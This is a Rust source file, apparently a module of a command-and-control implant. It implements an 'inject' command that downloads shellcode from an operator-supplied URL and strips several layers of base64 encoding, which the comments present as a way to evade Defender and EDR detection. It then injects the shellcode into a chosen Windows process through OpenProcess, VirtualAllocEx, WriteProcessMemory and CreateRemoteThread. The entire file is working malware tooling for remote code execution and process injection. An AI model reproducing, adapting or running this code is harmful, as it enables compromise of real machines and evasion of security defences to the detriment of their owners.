use std::error::Error;
use crate::logger::Logger;
use crate::cmd::CommandArgs;
#[cfg(windows)] use base64::decode as b64_decode;
#[cfg(windows)] extern crate winapi;
#[cfg(windows)] extern crate kernel32;
#[cfg(windows)] use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
#[cfg(windows)] use std::ptr;
#[cfg(windows)] use reqwest::Client;

/// Shellcode-based attacks for further compromise.
/// 
/// On Windows, this will attempt process injection.
/// 
/// To avoid shellcode detection by Defender and other EDRs,
/// the shellcode is expected to be b64-encoded, comma-separated hex representations
/// of the shellcode, which is decoded at runtime.
/// 
/// The shellcode can be encoded `b64_iterations` times to make extra work for EDRs to process the payload.
/// This has proven effective in initial evasion.
/// 
/// ### Examples
/// Usage: `inject [shellcode_url] [pid] [b64_iterations] 🎯`
/// 
/// On Linux, the payload will be downloaded and executed like a regular dropper.
#[cfg(windows)] 
pub async fn handle(mut cmd_args: CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
        
    // Set up our variables; each one could fail on us.
    // Yes this is a lot of verbose error checking, but this
    // has to be rock solid or the agent will die.
    let mut url: &str;
    let mut pid: u32;
    let mut b64_iterations: u32;

    // Get URL
    match cmd_args.nth(0) {
        Some(u) => { 
            logger.debug(format!("Shellcode URL: {}", &u));
            url = u; 
        },
        None    => { return Ok("Could not parse URL".to_string()); }
    };

    // Get pid
    match cmd_args.nth(0) {
        Some(ps) => {
            if let Ok(p) = ps.parse::<u32>() {
                logger.debug(format!("Injecting into PID: {:?}", &p));
                pid = p;
            } else {
                let err_msg = "Could not parse PID";
                logger.err(err_msg.to_string());
                return Ok(err_msg.to_string());
            }
        },
        None => { 
            let err_msg = "Could not extract PID";
            logger.err(err_msg.to_string());
            return Ok(err_msg.to_string()); 
        }
    };

    // Get b64_iterations
    match cmd_args.nth(0) {
        Some(bs) => {
            if let Ok(b) = bs.parse::<u32>() {
                b64_iterations = b;
            } else {
                return Ok("Could not parse b64 iterations".to_string());
            }
        },
        None => { return Ok("Could not extract b64 iterations".to_string()); }
    };

    logger.debug(format!("Injecting into PID {:?}", pid));
    let client = Client::new();
    if let Ok(r) = client.get(url).send().await {
        if r.status().is_success() {   
            logger.info(format!("Got the shellcode")); 
            // Get the shellcode. Now we have to decode it
            let mut shellcode_encoded: Vec<u8>;
            let mut shellcode_string: String;
            let mut shellcode: Vec<u8>;
            if let Ok(sc) = r.text().await {
                shellcode_encoded = Vec::from(sc.trim().as_bytes());
                logger.info(format!("Got encoded bytes"));
                for i in 0..b64_iterations {
                    logger.debug(format!("Decode iteration: {i}"));
                    match b64_decode(shellcode_encoded) {
                        Ok(d) => {
                            shellcode_encoded = d
                                .into_iter()
                                .filter(|&b| b != 0x0a)
                                .collect();
                        },
                        Err(e) => { return Ok(e.to_string()); }
                    };
                    
                }
                // Convert bytes to our proper string
                shellcode_string = String::from_utf8(shellcode_encoded)?;
                // At this point, we have the comma-separated "0xNN" form of the shellcode.
                // We need to get each one until a proper u8.
                shellcode = shellcode_string
                    .split(",")
                    .map(|s| s.replace("0x", ""))
                    .map(|s| s.replace(" ", ""))                    
                    .map(|s|{ 
                        match u8::from_str_radix(&s, 16) {
                            Ok(b) => b,
                            Err(_) => 0
                        }
                    })
                    .collect();

            } else {
                let err_msg = "Could not decode shellcode";
                logger.err(err_msg.to_string());
                return Ok(err_msg.to_string());
            }


            // Big thanks to trickster0
            // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
            unsafe {
                let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
                let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
                let mut n = 0;
                kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
                let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
                kernel32::CloseHandle(h);
            }
            return Ok("Injection completed!".to_string());
        } else {
            return Ok("Could not download shellcode".to_string());
        }   

    } else {
        return Ok(format!("Could not download from {url}"));
    }     
}

#[cfg(not(windows))]
pub async fn handle(cmd_args: CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
    Ok("Can only inject shellcode on Windows!".to_string())   
}